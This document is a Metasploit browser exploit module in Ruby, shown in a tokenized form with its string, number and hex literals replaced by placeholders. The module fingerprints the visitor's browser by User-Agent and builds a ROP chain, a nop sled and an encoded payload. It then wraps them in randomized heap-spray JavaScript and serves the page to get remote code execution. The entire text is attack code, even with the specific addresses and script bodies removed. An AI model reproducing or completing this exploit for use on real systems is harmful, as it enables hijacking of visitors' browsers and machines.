require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GoodRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , <str> = > - <int> , } , <str> = > { <str> = > <str> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > <int> , <str> = > <hex> , <str> = > <int> , } , ] , [ <str> , { <str> = > <hex> , <str> = > <str> , <str> = > <str> , <str> = > <int> , } , ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) end def junk return rand_text ( <int> ) . unpack ( <str> ) [ <int> ] . to_i end def repeat ( addr , rep ) arr = [ ] rep . times { arr << addr } return arr end def on_request_uri ( cli , request ) my_target = <str> agent = request . headers [ <str> ] if agent =~ <str> and agent =~ <str> my_target = targets [ <int> ] elsif agent =~ <str> and agent =~ <str> my_target = targets [ <int> ] elsif agent =~ <str> and agent =~ <str> my_target = targets [ <int> ] else send_not_found ( cli ) print_error ( <str> ) return end js = <str> sploit = <str> if my_target [ <str> ] == nil rop_gadgets = [ my_target . ret , junk , <hex> , repeat ( junk , <int> ) , <hex> , <hex> , junk , junk , junk , junk , junk , junk , <hex> , <hex> , repeat ( <hex> , <int> ) , <hex> , repeat ( <hex> , <int> ) , repeat ( <hex> , <int> ) , <hex> , repeat ( <hex> , <int> ) , <hex> , repeat ( <hex> , <int> ) , <hex> , <hex> , <hex> , <hex> , repeat ( <hex> , <int> ) , <hex> , <hex> , repeat ( <hex> , <int> ) , <hex> , repeat ( <hex> , <int> ) , <hex> , <hex> , <hex> , repeat ( <hex> , <int> ) , <hex> , <hex> , repeat ( junk , <int> ) , ] . flatten . pack ( <str> ) sploit << Rex :: Text . to_unescape ( rand_text_alpha ( my_target [ <str> ] ) , Rex :: Arch . endian ( target . arch ) ) sploit << Rex :: Text . to_unescape ( rop_gadgets , Rex :: Arch . endian ( target . arch ) ) sploit << Rex :: Text . to_unescape ( make_nops ( <int> ) , Rex :: Arch . endian ( target . arch ) ) sploit << Rex :: Text . to_unescape ( payload . encoded , Rex :: Arch . endian ( target . arch ) ) sploit << rand_text_alpha ( my_target [ <str> ] - sploit . length ) else shellcode = Rex :: Text . to_unescape ( payload . encoded , Rex :: Arch . endian ( target . arch ) ) target_ret = [ my_target . ret ] . pack ( <str> ) nops = Rex :: Text . to_unescape ( target_ret * <int> , Rex :: Arch . endian ( target . arch ) ) sploit << Rex :: Text . to_unescape ( target_ret * ( my_target [ <str> ] / <int> ) , Rex :: Arch . endian ( target . arch ) ) js_func_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_var_blocks_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_var_shell_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_var_nopsled_name = rand_text_alpha ( rand ( <int> ) + <int> ) js_var_index_name = rand_text_alpha ( rand ( <int> ) + <int> ) js = <<- <str> EOS <str> <str> EOS end obj_id = rand_text_alpha ( rand ( <int> ) + <int> ) sploit_name = rand_text_alpha ( rand ( <int> ) + <int> ) html = <<- <str> EOS <str> <str> EOS html = html . gsub ( <str> , <str> ) print_status ( <str> ) send_response ( cli , html , { <str> = > <str> } ) end end 
